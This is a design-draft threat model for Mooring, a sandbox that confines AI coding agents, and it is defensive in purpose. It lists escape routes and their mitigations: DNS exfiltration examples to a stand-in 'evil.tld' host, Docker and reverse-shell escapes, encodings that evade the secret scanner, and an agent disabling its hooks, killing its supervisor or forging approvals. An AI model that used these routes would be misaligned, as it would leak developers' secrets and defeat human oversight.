# Mooring: threat model

- **Status:** design draft, 2026-10-31. It will be revised at the end of every phase.
- **This document is binding.** The README, the website and launch posts may not claim more than this file does. If a claim here has no test in `test/escape/`, it is marked *(untested)*.
- **Related:** [ARCHITECTURE.md](ARCHITECTURE.md), [CONCEPT.md](CONCEPT.md) §3.3, [decisions.md](decisions.md).

---

## 1. Scope and assumptions

Mooring protects a developer's machine, secrets and data from **an AI coding agent the developer chose to run**, including everything that agent spawns. It assumes:

1. **The OS kernel and the sandbox primitives work as documented:** Linux namespaces, bubblewrap and seccomp; macOS Seatbelt; WSL2.
2. **Mooring's own code, config and state are outside the agent's reach.** Mooring must make this assumption true (§6.9).
3. **The developer is not the adversary.** They can switch Mooring off, approve anything, or run the agent unmoored.
4. **The machine isn't already compromised** by malware running as the user outside Mooring.

## 2. Assets

| Asset | Examples | Main threat |
| --- | --- | --- |
| **Secrets** | `.env` values, SSH keys, cloud credentials, CLI tokens (`gh`, `npm`, Railway), API keys, keychain items | Leaving the machine |
| **Local data** | Project files including untracked and gitignored files; the `.git` directory; the rest of `$HOME` | Destroyed or corrupted |
| **Remote data** | Databases, cloud volumes, buckets, infrastructure | Destroyed through credentials the agent can reach |
| **Integrity of future runs** | Git hooks, scripts, CI config, shell rc files | Silently backdoored, then run later outside Mooring |
| **Mooring itself** | Its CA key, policy, logs, snapshot store, approval channels | Tampered with to switch protection off or to forge approvals |
| **The developer's attention** | Approval prompts | Fatigue; misleading prompts |

## 3. Adversaries

| ID | Adversary | Capability | In scope? |
| --- | --- | --- | --- |
| **A1** | **The careless agent.** No malice; it makes a destructive mistake (`rm -rf`, `DROP TABLE`, `volumeDelete`) | Normal tool use | **Yes. The primary case.** |
| **A2** | **The prompt-injected agent.** Instructions hidden in a web page, issue, README, MCP result or chat message | Steers the agent's tool use, including writing and running scripts | **Yes** |
| **A3** | **Malicious code inside the sandbox.** A compromised dependency's postinstall, a malicious skill, or code the injected agent wrote and ran | Arbitrary code execution as the user, *inside* the sandbox | **Yes, for enforced guarantees.** Content scanning alone can't stop A3 (§6.5) |
| **A4** | **A network attacker** between Mooring and upstream services | Can intercept or modify traffic | Yes: Mooring always verifies upstream TLS |
| **A5** | **A compromised Mooring supply chain** (a dependency, a release, the update channel) | Code running as Mooring, outside the sandbox | Yes, through process: minimal dependencies, a lockfile, signed releases, SBOM (§6.10) |
| **A6** | **Malware already on the machine, outside Mooring** | Anything the user can do | **No** |
| **A7** | **A kernel or hypervisor exploit** from inside the sandbox | Root on the host | **No** (we keep the surface small, e.g. seccomp, but don't claim to stop this) |

## 4. Trust boundaries

```
            UNTRUSTED                       │              TRUSTED
                                            │
  agent process tree (A1, A2, A3)           │   session supervisor (Mooring)
  hook shim (runs inside, so untrusted)     │   daemon, dashboard
  content the agent fetched                 │   Mooring state dir, CA key, policy
  files the agent wrote                     │   approval channels (after pairing)
                                            │
  ──────────── boundary 1: OS sandbox (namespaces / Seatbelt) ─────────────
  ──────────── boundary 2: the proxies (HTTP(S), Postgres) ─────────────────
  ──────────── boundary 3: the approval (a human, out of band) ─────────────
                                            │
  upstream services ◄── verified TLS ── proxies    (A4 sits on this wire)
```

**Important consequences:**

- **The hook shim is on the untrusted side.** Anything the hook can say to Mooring, the agent can say too. So the control API is *request-only*: an inside caller can ask for an approval, but can never grant one.
- **Approvals come only from outside:** a terminal not attached to the sandbox, the dashboard (token-protected), or paired chat accounts.
- **Files the agent wrote cross back into the trusted world** when the developer runs them later. See §6.6.

## 5. Guarantees by platform

Tiers: **Enforced** (holds against A3), **Detected** (best effort; catches A1, A2 and naive A3), **Advisory** (needs the agent's hooks to call us). A dash means not available.

| Guarantee | Linux (bwrap) | WSL2 | macOS (Seatbelt) | Native Windows |
| --- | --- | --- | --- | --- |
| No network path except Mooring's proxies | **Enforced** | **Enforced** (interop must be blocked) | **Enforced** for TCP *(untested)* | — (planned: MXC) |
| No direct DNS (UDP/53, DoT) | **Enforced** (no resolver, no route) | **Enforced** | **Not guaranteed.** The system resolver may be reachable; see §6.3 | — |
| Destination policy (allow, deny, ask per host) | **Enforced** | **Enforced** | **Enforced** | — |
| Secrets blocked in outbound content (raw and encoded) | **Detected** | **Detected** | **Detected** | — |
| Bound secrets only in auth headers to their bound hosts | **Detected** (needs TLS interception of that host) | same | same | — |
| No writes outside the project and allowlisted dirs | **Enforced** | **Enforced** (not `/mnt/c`) | **Enforced** *(untested)* | — |
| Protected paths unreadable (e.g. `~/.ssh` private keys) | **Enforced** when the policy says *hide* | same | **Enforced** *(untested)* | — |
| Per-step undo of project files (incl. gitignored and `.git`) | Snapshots: **Enforced** when the step boundary fires; step boundaries are **Advisory** for hook agents and heuristic otherwise | same | same | — |
| Destructive SQL to guarded Postgres held for approval | **Enforced** that there is no other route; classification is **Detected** | same | same | — |
| Cloud API guards (e.g. Railway `volumeDelete`) | **Detected** (needs interception; per-guard rules) | same | same | — |
| Dangerous *commands* (`git push --force`, `terraform destroy`) paused | **Advisory** (hooks) | same | same | — |
| Complete record of network and SQL activity | **Enforced** | **Enforced** | **Enforced** | — |
| Complete record of commands run | **Advisory** (hooks), plus best-effort process sampling | same | same | — |

**What happens when Mooring can't build the sandbox** (for example Ubuntu 24.04 without the AppArmor profile, or inside a Docker container with the default seccomp profile): Mooring **refuses to start the agent** and prints the fix. There is no silent downgrade. An explicit `--unsandboxed` "record only" mode may exist later. If it does, every line it prints will say *no enforcement*.

## 6. Escape routes, and what stops each one

Each entry has an ID. `test/escape/` will hold one test per ID, run on every release.

### 6.1 Child processes and process launchers (ESC-PROC)

| Attempt | Result |
| --- | --- |
| Fork, double-fork, `setsid`, `nohup`, `disown` | Still inside the namespaces and Seatbelt; children inherit. `--die-with-parent` means that when the supervisor dies, the sandbox dies. **Enforced** |
| `systemd-run --user …`, `busctl`, `gdbus` to start a process outside | `/run/user/$UID` (the user bus) and the system bus are masked. **Enforced** on Linux |
| `docker run -v /:/host …` | The Docker socket is masked, and `DOCKER_HOST` is unset. **Enforced** on Linux. On macOS, the profile denies connections to Unix sockets outside the project *(untested)* |
| `crontab`, `at`, setuid helpers | `PR_SET_NO_NEW_PRIVS` stops setuid binaries elevating, so they fail. User crontab files are outside the writable set. **Enforced** on Linux |
| `ssh localhost`, a reverse shell | No route. **Enforced** |
| WSL2: run `cmd.exe` or `powershell.exe` | `/run/WSL` hidden, `WSL_INTEROP` unset, `/mnt/c` not mounted. **Enforced**, but must be tested on every WSL release |
| macOS: `open`, `osascript`, `launchctl`, XPC services | Profile denies them broadly. **Partially enforced.** Apple's mach services are a large surface, and some escapes via launchd may remain. Documented as a known weakness |
| Nested user namespace to remount `/` writable | `--disable-userns`. **Enforced** on Linux |

### 6.2 Raw sockets, UDP, QUIC, ICMP, IPv6 (ESC-NET)

On Linux the sandbox's network namespace has only `lo`. `CAP_NET_RAW` inside a user namespace applies only to that empty namespace, so raw packets, UDP, QUIC/HTTP3, ICMP tunnelling and IPv6 go nowhere. **Enforced.** On macOS the profile allows outbound only to `localhost:<ports>`. **Enforced** for TCP; raw sockets are *(untested)*.

### 6.3 DNS exfiltration (ESC-DNS)

- **Direct.** Linux has no resolver and no route, so this is **enforced**. On macOS, DNS goes through system daemons (`mDNSResponder`), so `getaddrinfo("<secret>.evil.tld")` may leak the label even when the connect is blocked. **Not guaranteed** until Phase-macOS testing proves a `mach-lookup` deny closes it.
- **Through the proxy.** `CONNECT <secret>.evil.tld:443`, or an absolute URL with that host. The proxy **scans the hostname and applies destination policy before resolving it**. **Detected** for known secrets; a hostname to a denied domain is **Enforced**.
- **Through DoH.** It's just HTTPS to a resolver host, so it's scanned like any other request. **Detected.**

### 6.4 Unix sockets and other IPC (ESC-IPC)

| Channel | Status |
| --- | --- |
| Abstract Unix sockets | Scoped to the network namespace, so they can't reach host services. **Enforced** on Linux |
| Pathname sockets: Docker, D-Bus, systemd, `ssh-agent`, `gpg-agent`, X11/Wayland | Masked by default. X11 matters: it allows keystroke injection into other windows. **Enforced** on Linux for the masked list |
| Any *other* pathname socket left visible in a read-only bind | Reachable unless seccomp blocks new `AF_UNIX` sockets (planned Phase 1, ARCHITECTURE §4.1). **Until then: residual risk, documented** |
| Inherited file descriptors | The supervisor passes only stdio (and the bwrap seccomp fd). **Enforced** |
| `/dev/shm`, SysV IPC | Private IPC namespace. **Enforced** |

### 6.5 Getting secrets past the content scanner (ESC-LEAK)

**This is where we must be most honest.** Content scanning is **Detected**, not **Enforced**.

| Technique | Caught? |
| --- | --- |
| Raw value in URL, header or body | Yes |
| base64 (all three byte alignments), base64url, hex (either case), URL-encoding, JSON/JS string escapes | Yes |
| gzip, deflate, brotli or zstd request bodies | Yes (decoded before scanning) |
| A fragment of the secret (≥ N chars, N set per secret length) | Yes |
| The secret split across several requests to one destination | Yes, within a time window: per-destination fragment coverage tracking. **Best effort** |
| multipart/form-data, WebSocket text frames | Yes |
| WebSocket binary frames, HTTP/2 streams | Phase 1 decides. Until scanned, hosts using them are *passthrough* (destination policy only) or denied |
| Reversed, Caesar-shifted, XOR'd, encrypted, compressed in a non-standard way, written one character per request across hosts | **No.** An adversary with code execution (A3) can always encode data in a way we can't recognise |
| Steganography in images, timing channels, request sizes, the choice of URL paths | **No** |
| Leaks to the agent's model provider in the conversation itself | **Not blocked by default.** The provider is a destination you chose. A redact/mask mode is a later option |

**What actually stops A3** is **destination control**, which is **Enforced**:

- In **strict** mode only allowlisted hosts are reachable.
- In **balanced** mode (the proposed default), a *tainted* session can't send request bodies to newly contacted hosts without approval.

Even then, A3 can still leak through an allowlisted host that stores user content, such as a gist, an issue comment, a package registry or a pastebin. **We say this plainly in the docs.**

**Mooring's own CA.** The CA key is masked from the sandbox. The CA is trusted only inside the sandbox, unless you opt in to adding it to your login keychain on macOS. If the key leaked, the attacker could intercept *sandboxed* traffic only, unless you opted in to system trust.

**Pinned or incompatible clients.** Their hosts are *passthrough*: destination policy applies but content isn't inspected. The timeline marks every passthrough connection.

**Domain fronting.** On intercepted connections the HTTP `Host` must match the TLS SNI; a mismatch is denied. On passthrough connections we can't check this. *(Claude Code's sandbox docs flag the same risk.)*

### 6.6 Files that run later, outside Mooring (ESC-LATER)

The agent can write project files that execute later, when *you* run them unmoored:

- `.git/hooks/*` and `core.hooksPath`;
- `package.json` scripts and `postinstall`;
- `Makefile`;
- `.envrc` (direnv);
- `.vscode/tasks.json` and `settings.json`;
- `.github/workflows/*`;
- `.pre-commit-config.yaml`;
- `pyproject.toml` build hooks;
- `conftest.py`;
- `Dockerfile`s.

| Mitigation | Tier |
| --- | --- |
| Writes outside the project (e.g. `~/.bashrc`, `~/.config/autostart`, `~/.ssh/authorized_keys`) are impossible | **Enforced** on Linux; macOS *(untested)* |
| Writes to a known **auto-exec path** in the project are flagged on the timeline and, by policy, held for approval | **Detected** (the path list is incomplete by nature) |
| `mooring diff` highlights auto-exec changes since the session started; `mooring undo` reverts them | **Enforced** that the diff exists; noticing it is up to you |
| Run the agent's code (tests, builds) **through Mooring too**: `mooring run -- npm test` | Recommended practice, not automatic |

**Residual risk, stated plainly:** if you run code the agent wrote, unsandboxed, it runs with your full authority. Mooring can show you what changed; it can't make agent-written code safe.

### 6.7 Abusing or disabling the agent's hooks (ESC-HOOK)

Hooks are **Advisory** (ADR-0011). The research behind this is real: CVE-2026-25725, CVE-2026-33068, CVE-2025-59536, CVE-2025-54131, CVE-2026-22708 and the Claude Code advisory list ([GitHub](https://github.com/anthropics/claude-code/security/advisories)).

| Attempt | Result |
| --- | --- |
| The agent edits `.claude/settings.json` or `~/.claude/settings.json` to set `disableAllHooks` or remove our hook | Agent config files are **bound read-only** inside the sandbox. Our hooks live in the **highest-precedence tier** the agent offers (Claude Code managed settings, Codex `requirements.toml`, Cursor enterprise `hooks.json`), overlaid only inside the sandbox. **Enforced** on Linux (overlay *(untested)* in Phase 2) |
| The hook times out or crashes, and the agent proceeds (Claude Code, Cursor and Gemini fail **open** by default) | We set fail-closed options where they exist (`onFailure: "block"`, `failClosed: true`), and the shim outputs *deny* on any internal error. Where an agent can't fail closed, the gap is documented per adapter |
| The command string is obfuscated to slip past pattern matching (`/bin/rm`, `bash -c`, `$IFS`, backticks, scripts) | Expected. Command rules are a **courtesy**. The real limits are the filesystem (writes), the proxy (network) and the DB guard (SQL), all of which see the *effect*, not the string |
| The agent calls the control API directly to fake steps or approvals | The API is request-only. Fake steps cause extra snapshots (rate-limited); approvals can't be granted from inside |
| The agent never calls hooks at all | Steps fall back to heuristics; enforcement is unaffected |
| An approval prompt crafted to mislead: a huge command with the payload at the end, Unicode look-alikes, ANSI escapes | Prompts show the **normalised, escaped, full** command or request: control characters made visible, length shown, and destination plus matched rule up front |
| TOCTOU: you approve request X, and the agent sends Y | Approvals bind to a hash of the exact held request or statement, and are single-use with an expiry |
| Approval fatigue | Defaults are tuned to ask rarely. Policy supports "allow for this session". Every ask states why it was asked |

### 6.8 Tampering with Mooring from inside (ESC-SELF)

| Attempt | Result |
| --- | --- |
| Read or modify Mooring's state, CA key, policy or logs | The state dir is masked and the config is read-only. A project `.mooring/policy.yaml` is read-only inside the sandbox **and may only tighten** user policy. **Enforced** on Linux |
| Kill the supervisor | The supervisor isn't in the sandbox's PID namespace, so it can't be signalled. If it dies anyway, the sandbox dies (`--die-with-parent`). **Fail closed** |
| Fill the disk to break snapshots (resource exhaustion) | Snapshot store and log quotas. When a quota is hit, Mooring **pauses and asks** rather than continuing without undo |
| Exhaust the proxy (many connections, huge bodies) | Connection and body caps. Over the cap, deny |
| Request smuggling between agent and upstream | The proxy **re-serialises** requests and never forwards raw bytes it didn't parse. Ambiguous framing (both `Content-Length` and `Transfer-Encoding`, duplicate headers) is denied |

### 6.9 Mooring's own attack surface (ESC-SURF)

| Surface | Control |
| --- | --- |
| Upstream TLS | Always verified against the system trust store. There is **no option to disable verification** |
| Dashboard and daemon HTTP | Bound to `127.0.0.1` only, a random token, a `Host` header check (DNS rebinding), CSRF tokens on state-changing calls, no CORS. This is the lesson of OpenClaw's exposed gateways ([Infosecurity](https://www.infosecurity-magazine.com/news/researchers-40000-exposed-openclaw/)) |
| Chat approval channels | Bot tokens are stored outside the sandbox (mode 0600). Approvers are paired once and allowlisted by platform user ID. Callback data carries a single-use nonce. **Approval messages are redacted:** a prompt never contains a secret value |
| Parsers: HTTP, TLS ClientHello, Postgres, SQL | A memory-safe language (TypeScript). The SQL parser is libpg_query compiled to WASM, so it can't touch the host. Parsers get fuzz tests from Phase 1 |
| Logs | Secrets are redacted before writing. Bodies are stored only as redacted, size-capped excerpts |

### 6.10 Supply chain (ESC-SUPPLY)

- **Dependencies:** few, each justified in an ADR or PR. Every license must be compatible.
- **Lockfile:** committed; `pnpm install --frozen-lockfile` in CI; `pnpm audit` on every PR.
- **Releases:**
  - built only in CI on Linux runners;
  - npm trusted publishing with provenance (needs the public repo);
  - checksums signed with cosign keyless;
  - an SBOM;
  - the **update check only notifies**, it never downloads or runs anything.

### 6.11 The credentials the agent legitimately holds (ESC-AUTHZ)

The PocketOS case: a valid token, sent to its own legitimate service, did something destructive. **The secret firewall doesn't help here**, by design, because the destination was correct. What helps:

1. **Guards on destructive API operations** (Railway, AWS, GCP, Vercel, Supabase…), held for approval. **Detected:** each guard knows only the operations it was written for.
2. **Least privilege advice** in onboarding: don't give agents broad tokens.
3. **Unknown write operations** to cloud control-plane hosts can be set to *ask* by policy.

### 6.12 Database-specific (ESC-SQL)

| Attempt | Result |
| --- | --- |
| Connect to the database by another route (direct IP, SSH tunnel, HTTP API such as Supabase REST or Neon's API) | No direct route inside the sandbox, so other ports are **Enforced** closed. HTTP data APIs go through the HTTP proxy and need their own guards (**Detected**) |
| `DELETE … WHERE true`, `WHERE 1=1`, `WHERE id > 0` | Constant-true predicates are caught. Selective-looking predicates that match everything can't be judged from SQL alone. Optional `EXPLAIN` row estimates with a threshold. **Detected** |
| `DO $$ … $$`, a function that runs dynamic SQL, `CALL`, triggers | Opaque to static analysis. By policy, held for approval in tainted sessions or always (configurable). **Detected** |
| `COPY … TO PROGRAM`, `lo_import`, `pg_read_file` | Always treated as dangerous. **Detected** |
| Multi-statement simple query hiding a `DROP` after a `SELECT` | Every statement is parsed. A parse failure counts as destructive |
| `SCRAM-SHA-256-PLUS` channel binding | Removed from the offered mechanisms; clients that *require* it can't be guarded. Documented |

## 7. Out of scope (explicitly)

- Kernel, hypervisor and CPU side-channel exploits (A7).
- Malware already running as the user outside Mooring (A6).
- An agent you run **without** `mooring` in front of it.
- Leaks through content you voluntarily send to your model provider.
- Damage done by code you later run yourself outside Mooring (mitigated by §6.6; not prevented).
- Remote side effects that were *allowed* (by policy or by your approval). Undo restores local files and guarded databases, not the world.
- Physical access, other users on the same machine, and a malicious OS administrator.

## 8. Invariants (each becomes a test)

1. **No sandbox, no agent.** If any sandbox layer fails to build, the agent doesn't start.
2. **No supervisor, no agent.** If the supervisor exits, the sandboxed tree is killed.
3. **The proxy fails closed.** On any internal error while handling a request, the request is denied.
4. **Unanswered approvals are denied.** On timeout, channel failure or daemon loss, the answer is deny.
5. **Nothing inside can grant.** No API reachable from inside the sandbox changes policy or approves.
6. **Secrets never reach disk via Mooring.** Logs, timelines, approval messages and crash reports are redacted. A test seeds known secrets and greps every output.
7. **Upstream TLS is always verified.**
8. **Local-only control plane.** No listener binds to a non-loopback address.

## 9. Open questions

- macOS DNS: can a `mach-lookup` deny stop resolver-based exfiltration without breaking proxied traffic? (Phase macOS)
- Seccomp on Linux: two-stage launch or `pasta --splice-only`? (Phase 1)
- The default for `~/.ssh` and cloud credentials: *hide* or *visible and scanned*? Proposed: hide private keys; leave cloud credentials visible but bound and scanned. (Phase 1)
- The default egress mode: *balanced* or *strict*? (Phase 1)
- How HTTP/2 and WebSocket binary frames are treated before full support: passthrough or deny? (Phase 1)
- Process sampling for command recording without hooks: is `/proc` polling of the PID namespace worth its cost? (Phase 2)
